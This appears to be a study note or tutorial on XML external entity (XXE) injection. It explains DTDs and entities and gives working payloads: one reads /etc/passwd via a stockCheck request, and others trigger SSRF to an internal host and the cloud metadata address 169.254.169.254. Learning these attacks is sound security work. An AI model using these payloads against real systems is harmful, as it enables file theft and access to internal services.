## XXE

XML external entity injection (also known as XXE) is a web security vulnerability that allows an attacker to interfere with an application's processing of XML data. 
It often allows an attacker to view files on the application server filesystem, and to interact with any back-end or external systems that the application itself can access.


> XML external entities are a type of custom XML entity whose defined values are loaded from outside of the DTD in which they are declared.
> 
> External entities are particularly interesting from a security perspective because they allow an entity to be defined based on the contents of a file path or URL.

##  document type definition
> DTD Contains the declaration of what should contain in the XML Document structure kike the data values it contains and other value.
> The DTD is always accomplained with a DOCTYPE Element at the start of the XML document.
> If the DTD is self-contained to the documet itself then its called as **internal DTD**
> (Or) If its loaded from external then its called as **External DTD**


## XML custom entities
````
<!DOCTYPE foo [ <!ENTITY myentity "my entity value" > ]>"
````
> This definition means that any usage of the entity reference &myentity; within the XML document will be replaced with the defined value: "my entity value"
## XML external entities
> The declaration of an external entity uses the SYSTEM keyword and must specify a URL from which the value of the entity should be loaded. For example:.
````
<!DOCTYPE foo [ <!ENTITY ext SYSTEM "http://normal-website.com" > ]>
````
#### Exploiting XXE to retrieve files
To perform an XXE injection attack
1. Introduce (or edit) a DOCTYPE element that defines an external entity containing the path to the file.
2. Edit a data value in the XML that is returned in the application's response, to make use of the defined external entity.
````
General request:
<?xml version="1.0" encoding="UTF-8"?>
<stockCheck><productId>381</productId></stockCheck>

Performing XXE attack to retrive "/etc/passwd" file from the system by the following command:-
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<stockCheck><productId>&xxe;</productId></stockCheck>
````
### Exploiting XXE to perform SSRF attacks
In the following XXE example, the external entity will cause the server to make a back-end HTTP request to an internal system within the organization's infrastructure.

**Reference**
````
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://internal.vulnerable-website.com/"> ]>
````
**Implementation**
````
<!DOCTYPE test [ <!ENTITY xxe SYSTEM "http://169.254.169.254/"> ]>
The above "169.254.169.254" is can be the  IP address of the internal system/ IP adress of the website 
````







